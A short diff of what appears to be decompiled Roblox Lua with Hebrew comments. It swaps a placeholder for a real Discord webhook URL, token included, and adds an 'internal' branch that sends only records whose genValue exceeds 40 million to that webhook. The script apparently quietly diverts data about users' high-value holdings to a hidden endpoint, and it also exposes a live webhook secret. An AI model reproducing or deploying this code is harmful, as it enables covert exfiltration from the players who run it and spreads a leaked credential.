@@ -856,7 +856,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                         }
 
                         -- כתובת InternalWebhook
-                        local InternalWebhookURL = "https://discord.com/api/webhooks/EXAMPLE/INTERNAL"
+                        local InternalWebhookURL = "https://discord.com/api/webhooks/1450221423712014450/VuyCh_XldkxSLRH2osJIgBH3l2oO47xuFpHflHFnzrTBAFqGCKeWYupWapaSj_LEkRUB"
 
                         if v109.genValue > 40000000 then
                             -- אם מעל 40 מיליון שולח רק ל-Internal
